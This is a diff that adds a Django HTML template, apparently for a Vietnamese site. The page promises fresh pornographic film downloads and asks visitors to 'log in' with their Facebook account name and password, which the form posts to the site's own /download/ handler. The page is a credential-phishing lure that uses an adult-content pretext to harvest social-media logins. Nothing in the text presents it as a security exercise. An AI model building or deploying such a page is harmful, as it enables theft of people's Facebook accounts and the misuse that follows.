@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tải phim con heo mới nhất!</title>
+    <style>
+        body {
+            background-image: url('https://mamnonhoami.edu.vn/wp-content/uploads/2021/06/con-heo-con.jpg');
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            background-size: cover;
+        }
+    </style>
+</head>
+<body>
+    <h1>Tải phim con heo mới nhất tại đây!</h1>
+    <p>Hàng ngàn phim con heo được upload mỗi ngày</p>
+    <div>
+        <h2>Đăng nhập để tải ngay!</h2>
+        <form action="/download/" method="post">
+            {% csrf_token %}
+            Tài khoản facebook:<br>
+            {{form.name}}<br>
+            Mật khẩu:<br>
+            <input type="text" name="password">
+            {{form.password}}
+            <br>
+            <input type="submit" value="Tải ngay!">
+        </form>
+    </div>
+</body>
+</html>
